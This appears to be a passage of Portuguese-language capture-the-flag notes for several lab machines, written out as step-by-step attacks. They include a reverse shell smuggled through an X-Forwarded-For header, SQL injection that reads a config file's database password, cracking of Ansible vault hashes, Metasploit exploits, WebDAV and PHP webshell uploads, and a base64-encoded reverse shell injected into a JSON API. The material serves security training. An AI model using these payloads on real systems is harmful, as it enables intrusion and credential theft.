      exit;
    }
    
    ?>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <!------ Include the above in your HEAD tag ---------->
    
    <div class="container">
    		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
    		
    	</div>
    	<section class="bg-dark text-center p-5 mt-4">
    		<div class="container p-5">
    <?php
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
        $ip = $_SERVER['REMOTE_ADDR'];
      };
      system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
    ?>
                  <h1 class="text-white">Welcome Back!</h1>
                  <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
    		</div>
    	</section>
    </div>
    ```
    
    A partir deste código sabemos que o código da firewall.php recebe um parâmetro de um get request, e o parâmetro chama se:
    
    `X_FORWARDED_FOR:` 
    
    ```
    GET /firewall.php HTTP/1.1
    Host: 10.129.96.75
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.129.96.75/challenge.php
    DNT: 1
    Connection: close
    Cookie: PHPSESSID=rkeqoah3nqahne5a8pqalgtmpq
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    X-FORWARDED-FOR: ;;
    ```
    
    `GET /firewall.php HTTP/1.1
    X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/10.10.14.84/1234 0>&1';`
    
    Colocar um listener na maquina e esperar pela resseção da comunicação 
    
- Manual SQL Injection
    
    [MySQL :: MySQL 8.0 Reference Manual :: 26.3.31 The INFORMATION_SCHEMA SCHEMATA Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2067.png)
    
    Apos testar sql injection, temos um resultado diferente
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2068.png)
    
    Pela imagem vemos que o sql injection foi bem sucedido. Ou seja, este site está vulnerável a sql injection.
    
    Agora passamos para Burp Suite 
    
    `' union select group_concat(schema_name) from information_schema.schemata-- -`
    
    ```
    Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
    ```
    
    Aqui vemos que existe uma base de dados diferente das default chamada `november`
    
    `player=' union select group_concat(table_name, column_name) from information_schema.columns where TABLE_SCHEMA like 'november'-- -`
    
    ```
    Sorry, flagone,playersplayer you are not eligible due to already qualifying.
    ```
    
    Melhorando o output
    
    `player=' union select group_concat(table_name,":",column_name, "\n") from information_schema.columns where TABLE_SCHEMA like 'november'-- -`
    
    ```
    Sorry, flag:one
    ,players:player
     you are not eligible due to already qualifying.
    ```
    
    Aqui vemos que o nome da tabela que existe na base de dados `november` é flag com a coluna one e a tabela players com coluna player
    
    Agora queremos o que contem a coluna one da tabela flag
    
    `player=' union select group_concat(one, "\n") from november.flag-- -`
    
    ```
    Sorry, **UHC{F1rst_5tep_2_Qualify}**
     you are not eligible due to already qualifying.
    ```
    
    Reparams que a flag que o site está a procura para adicionar o jogadores é a seguinte UHC{F1rst_5tep_2_Qualify}
    
    Como o site é vulnerável a um sql injection podemos retirar dados de acesso ao site
    
    ```
    └──╼ [★]$ gobuster dir -u http://10.129.7.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.129.7.248
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              php
    [+] Timeout:                 10s
    ===============================================================
    2024/01/30 15:32:39 Starting gobuster in directory enumeration mode
    ===============================================================
    /index.php            (Status: 200) [Size: 1220]
    /css                  (Status: 301) [Size: 178] [--> http://10.129.7.248/css/]
    /firewall.php         (Status: 200) [Size: 13]                                
    /config.php           (Status: 200) [Size: 0]                                 
    /challenge.php        (Status: 200) [Size: 772]
    ```
    
    Com o gobuster sabemos alguns dos ficheiros que existem no site
    
    Para fazermos inclusão de ficheiros num sql request fazemos o seguinte 
    
    `player=' union select LOAD_FILE('/var/www/html/config.php')-- -`
    
    ```
    Sorry, <?php
      session_start();
      $servername = "127.0.0.1";
      $username = "uhc";
      $password = "uhc-11qual-global-pw";
      $dbname = "november";
    
      $conn = new mysqli($servername, $username, $password, $dbname);
    ?>
     you are not eligible due to already qualifying.
    ```
    
    Daqui tiramos a credenciais para aceder via ssh
    
- Configuration manager
    
    Nmap 
    
    ```
    nmap -p- 10.10.11.222
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 10:54 BST
    Nmap scan report for 10.10.11.222
    Host is up (0.012s latency).
    Not shown: 65507 closed tcp ports (conn-refused)
    PORT STATE SERVICE
    53/tcp open domain
    80/tcp open http
    88/tcp open kerberos-sec
    135/tcp open msrpc
    139/tcp open netbios-ssn
    389/tcp open ldap
    445/tcp open microsoft-ds
    464/tcp open kpasswd5
    593/tcp open http-rpc-epmap
    636/tcp open ldapssl
    3268/tcp open globalcatLDAP
    3269/tcp open globalcatLDAPssl
    5985/tcp open wsman
    8443/tcp open https-alt
    9389/tcp open adws
    47001/tcp open winrm
    ```
    
    Website
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2069.png)
    
    `smbclient //10.10.11.222/Development -N`
    
    Ao procurar na diretoria encontramos um ficheiro main.yml dentro da pasta ansible-vault
    
    ```
    cat defaults/main.yml
    ---
    pwm_run_dir: "{{ lookup('env', 'PWD') }}"
    pwm_hostname: authority.htb.corp
    pwm_http_port: "{{ http_port }}"
    pwm_https_port: "{{ https_port }}"
    pwm_https_enable: true
    There are three different hashes in this file ( pwm_admin_login , pwm_admin_password , and 
    ldap_admin_password ) which we can convert to a crackable format using ansible2john.py per
    this guide. 
    First, we need to save each hash to a file and clean them up with sed to remove the whitespaces.
    Now we can convert each one using ansible2john.py .
    Now let's try to crack the hashes using Hashcat . The mode we want is 16900 . We can feed the
    hashes to Hashcat using the rockyou.txt wordlist, after trimming off the front part of the hash
    (they should start with $ansible$ ). 
    pwm_require_ssl: false
    pwm_admin_login: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    <SNIP>
    pwm_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    <SNIP>
    ldap_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    <SNIP>
    ```
    
    Colocar as passwords num ficheiro
    
    ```
    sed -i 's/^[ \t]*//' vault1
    cat vault1
    $ANSIBLE_VAULT;1.1;AES256
    32666534386435366537653136663731633138616264323230383566333966346662313161326239
    6134353663663462373265633832356663356239383039640a346431373431666433343434366139
    35653634376333666234613466396534343030656165396464323564373334616262613439343033
    6334326263326364380a653034313733326639323433626130343834663538326439636232306531
    3438
    ```
    
    Utilizar o ficheiro `python3 /usr/share/john/ansible2john.py vault1` para retirar as hash e depois colocar no john the ripper 
    
    ```
    python3 /usr/share/john/ansible2john.py vault1
    vault1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b98
    09d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d7
    34abba49403c42bc2cd8
    python3 /usr/share/john/ansible2john.py vault2
    vault2:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e
    9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678
    f4a8b1f8550905f70da5
    python3 /usr/share/john/ansible2john.py vault3
    vault3:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502
    f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814e
    bcf2fe98334284203635
    ```
    
    Passwords
    
    ```
    hashcat -m 16900 vault_hashes /usr/share/wordlists/rockyou.txt
    hashcat (v6.1.1) starting...
    <SNIP>
    $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1df
    f07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f
    8550905f70da5:!@#$%^&*
    $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e04
    1732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba4
    9403c42bc2cd8:!@#$%^&*
    $ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd
    9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe9
    8334284203635:!@#$%^&*
    ```
    
    Instalar o ansible vault e depois utilizar estes comandos
    
    `cat vault1 | ansible-vault decrypt`
    
    ```
    cat vault1 | ansible-vault decrypt
    Vault password:
    Decryption successful
    svc_pwm
    
    cat vault2 | ansible-vault decrypt
    Vault password:
    Decryption successful
    pWm_@dm!N_!23
    
    cat vault3 | ansible-vault decrypt
    Vault password:
    Decryption successful
    DevT3st@12
    ```
    
    Obtemos as credencias 
    
- File Server
    
    ```bash
    nmap --top-ports 65536 10.0.0.99
    nmap -sV -p 80 10.0.0.99
    searchsploit hfs
    
    Metasploit
    msfconsole
    use exploit/windows/http/rejetto_hfs_exec
    set RPORT 80
    set RHOSTS 10.0.0.99
    set LHOST 10.10.0.4 <Make Sure to Enter Valid LHOST IP Address>
    exploit
    
    Command: shell
    cd /
    dir
    type flag.txt
    ```
    
- TomCat Attack
    
    ```bash
    nmap --top-ports 65536 10.0.0.14
    
    Metasploit
    msfconsole
    use exploit/multi/http/tomcat_jsp_upload_bypass
    set RHOSTS 10.0.0.141
    check (We are running a “check” command in the metasploit framework to make sure that if
    the target is vulnerable to jsp_upload_bypass or not.)
    exploit
    ```
    
- Web App Vulnerability Scanning With WMAP
    
    ```bash
    msfconsole
    load wmap
    wmap_sites -a 192.157.89.3
    wmap_targets -t http://192.157.89.3
    wmap_sites -l
    wmap_targets -l
    wmap_run -t
    wmap_run -e
    ```
    
- WebDav Attack
    
    ```bash
    Metodo 1
    
    nmap --script http-enum -sV -p 80 10.0.16.177
    
    davtest -url http://10.0.16.177/webdav
    
    davtest -auth bob:password_123321 -url http://10.0.16.177/webdav
    
    cadaver http://10.0.16.177/webdav
    
    put /usr/share/webshells/asp/webshell.asp
    
    Metodo 2
    
    nmap --script http-enum -sV -p 80 10.0.17.27
    
    davtest -url http://10.0.17.27/webdav
    
    davtest -auth bob:password_123321 -url http://10.0.17.27/webdav
    
    Metasploit
    msfconsole -q
    use exploit/windows/iis/iis_webdav_upload_asp
    set RHOSTS 10.0.17.27
    set HttpUsername bob
    set HttpPassword password_123321
    set PATH /webdav/metasploit%RAND%.asp
    exploit
    ```
    
- Adminer
    
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2070.png)
    
    ```c
    apt install mariadb-server-10.3 mariadb-client-10.3
    systemctl start mariadb
    
    mariadb
    The MariaDB root password isn't set by default, so we set it to something 
    non-guessable.Next, we can create a database, and a lower-privileged user that
    can be used to connect to it remotely. Note that we specify backup@10.10.10.187,
    as backup@localhost would be a different user, and wouldn't be able to connect
    from 10.10.10.187. Next, add an exception in the firewall policy to allow 
    connections from 10.10.10.187 to port 3306 locally. apt install 
    mariadb-server-10.3 mariadb-client-10.3 systemctl start mariadb
    
    mysql -u root -p
    ALTER USER 'root'@'localhost' IDENTIFIED BY '<YOUR PASSWORD>';
    CREATE DATABASE backup; USE backup; CREATE TABLE backup (name VARCHAR(2000));
    CREATE USER 'backup'@'10.10.10.187' IDENTIFIED BY '<YOUR PASSWORD>';
    GRANT ALL PRIVILEGES ON backup.* TO 'backup'@'10.10.10.187';
    
    Next, add an exception in the firewall policy to allow connections from 
    10.10.10.187 to port 3306 locally.
    
    ufw allow from 10.10.10.187 to any port 3306
    ```
    
    We now need to configure MariaDB to bind to our tun0 VPN address. Issue the command below to identify the MySQL configuration files.
    
    ```c
    mysqld --help --verbose | less
    mysqld Ver 10.3.23-MariaDB-1 for debian-linux-gnu on x86_64 (Debian buildd-unstable)
    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
    Starts the MariaDB database server.
    Usage: mysqld [OPTIONS]
    Default options are read from the following files in the given order:
    /etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf
    ```
    
    [PHP tool 'Adminer' leaks passwords – Sansec](https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability)
    
    ## `Ver melhor no pdf Admirer`
    
- Prepared Statments
    
    Nesta função podemos ver que num site, ou guardar o perfil do jogador, existe SQL injection, na variável `$setStr` .
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2071.png)
    
    Esta função é utilizada quando se clica o rato no retangulo `save and close` .
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2072.png)
    
    No burp Suite interceptamos o request
    
    ```
    GET /save_game.php?clicks=99999999999&level=12 HTTP/1.1
    Host: clicker.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Referer: http://clicker.htb/play.php
    Cookie: PHPSESSID=22f47alrmu28dasmtv0u9bhcjb
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    ```
    
    A string é construída como cliques = '<cliques>', nível = '<nível>' onde os valores de "<cliques>" e "<nível>" são sanitizados com PDO::quote e não são vulneráveis a injeção SQL. No entanto, podemos modificar os nomes dos parâmetros para injetar colunas adicionais na parte SET da consulta.
    
    A variável `$setStr` é construída da seguinte forma:
    
    ```
    foreach ($args as $key => $value) {
    	$setStr .= $key . "=" . $pdo->quote($value) . ",";
    }
    ```
    
    Por exemplo, vamos usar o seguinte payload para modificar nossa função para "Admin". Usamos a forma codificada da URL do sinal de igual ( %3d ) para injetar uma atribuição adicional de coluna/valor na declaração, que será concatenada na string `setStr`.
    
    `/save_game.php?clicks%3d4,role%3d'Admin',clicks=4&level=0`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2073.png)
    
    Uma vez que façamos login na aplicação novamente, podemos confirmar que temos a função de administrador porque a opção de Administração apareceu.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2074.png)
    
    Na pagina `Administration` encontramos a tabela das classificações dos utilizadores com mais clicks, assim como um botão para 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2075.png)
    
    Ao clicar em exportar interceptamos o pedido e temos dois parâmetros, `threshold` e `extension` . O que podemos tentar, como sabemos que o site foi construído em php, tentar inserir um ficheiro `PHP`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2076.png)
    
    Para executar código no servidor, precisamos inserir código PHP na tabela exportada de alguma forma. Mais uma vez, podemos explorar a primeira vulnerabilidade para alterar nosso apelido para um malicioso, que inclui código PHP. Desta vez, modificamos a coluna de apelido e a definimos como um payload de uma shell da web PHP.
    
    `/save_game.php?clicks=8&level=0&nickname=<?php+system($_REQUEST['cmd']);?>`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2077.png)
    
    Agora podemos tentar usar a função de exportação novamente, desta vez definindo o limite como 0 e a extensão como php:
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2078.png)
    
    Podemos confirmar a execução remota de código (RCE) visitando o arquivo gerado e configurando o parâmetro ?cmd=id.
    
    `/exports/top_players_586n8am4.php?cmd=id`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2079.png)
    
- Devzat (chat)
    
    Visitando http://devzat.htb/, encontramos no final a seguinte mensagem
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2080.png)
    
    `ssh -l amra devzat.htb -p 8000`
    
    The /help command reveals another interesting command, /commands to list all available commands.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2081.png)
    
    Usar o Gobuster para revelar diretórios e arquivos adicionais hospedados no servidor web não produz resultados úteis. No entanto, também podemos usar o Gobuster para descobrir hosts virtuais adicionais.
    
    `gobuster vhost -u [http://devzat.htb](http://devzat.htb/) -w /usr/share/seclists/Discovery/Web-Content/raftsmall-words.txt -r`
    
    Observe a flag -r para seguir redirecionamentos a fim de produzir apenas vhosts válidos, já que tudo é redirecionado para devzat.htb.
    
    Descobrimos com sucesso um novo host virtual, pets.devzat.htb. Vamos adicioná-lo ao nosso arquivo de hosts para que possamos acessá-lo.
    
    `echo '10.10.11.118 pets.devzat.htb' >> /etc/hosts`
    
    Agora que temos um novo host virtual, podemos tentar executar o Gobuster contra o host "pets" para verificar se existem diretórios ou arquivos interessantes.
    
    `gobuster dir -u [http://pets.devzat.htb](http://pets.devzat.htb/) -w /usr/share/seclists/Discovery/WebContent/raft-small-words.txt -b 200`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2082.png)
    
    [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)
    
    Podemos usar o Git-dumper para extrair o conteúdo da pasta .git recém-descoberta.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2083.png)
    
    Ao examinar o arquivo main.go, encontramos o código-fonte para o host virtual "pets". Revisando cuidadosamente o código-fonte, podemos elaborar uma cadeia de exploração que nos dará um shell reverso. Primeiramente, a função handleRequest() revela o endpoint /api/pet.
    
    ```
    func handleRequest() {
     <SNIP>
     // API routes
     apiHandler := http.HandlerFunc(petHandler)
     http.Handle("/api/pet", headerMiddleware(apiHandler))
     log.Fatal(http.ListenAndServe("127.0.0.1:5000", nil))
    }
    ```
    
    Este chama a função `handleRequest`
    
    ```
    func petHandler(w http.ResponseWriter, r *http.Request) {
     // Dispatch by method
     if r.Method == http.MethodPost {
     addPet(w, r)
     } else if r.Method == http.MethodGet {
     getPets(w, r)
     } else {
     http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
     }
     // TODO: Add Update and Delete
    }
    ```
    
    De acordo com esta função, se fizermos um pedido POST para este endpoint, podemos adicionar um animal de estimação. O código-fonte também revela a estrutura de um objeto Pet.
    
    ```
    type Pet struct {
     Name string `json:"name"`
     Species string `json:"species"`
     Characteristics string `json:"characteristics"`
    }
    ```
    
    Para adicionar um animal de estimação, precisamos enviar os dados no formato JSON, de acordo com o seguinte formato:
    
    ```
    {
     "name": "Test pet",
     "species": "dog",
     "characteristics": "corgi"
    }
    ```
    
    Depois chama a função `addpet()`
    
    ```
    func addPet(w http.ResponseWriter, r *http.Request) {
     <SNIP>
     addPet.Characteristics = loadCharacter(addPet.Species)
     Pets = append(Pets, addPet)
     w.WriteHeader(http.StatusOK)
     fmt.Fprint(w, "Pet was added successfully")
    }
    ```
    
    A função `addPet()` faz uma última chamada para `loadCharacter()` antes de adicionar o animal de estimação.
    
    ```
    func loadCharacter(species string) string {
     cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
     stdoutStderr, err := cmd.CombinedOutput()
     if err != nil {
     return err.Error()
     }
     return string(stdoutStderr)
    }
    ```
    
    Revisar esta função revela uma vulnerabilidade de injeção de código. Mais especificamente, "características do gato/"+espécie é usado como argumento para sh sem qualquer sanitização. Portanto, podemos criar um payload para obter um shell reverso e injetá-lo no campo de espécie dos dados Json.
    
    Primeiro, configuramos um ouvinte na nossa máquina local:
    
    `nc -lvnp 9001`
    
    `curl -X POST -d '{"name":"Test pet","species":"dog;echo
    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzkwMDEgMD4mMSAK|base64 -
    d|bash","characteristics":"corgi"}' -H "'Content-Type': 'application/json'"
    "[http://pets.devzat.htb/api/pet](http://pets.devzat.htb/api/pet)"`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2084.png)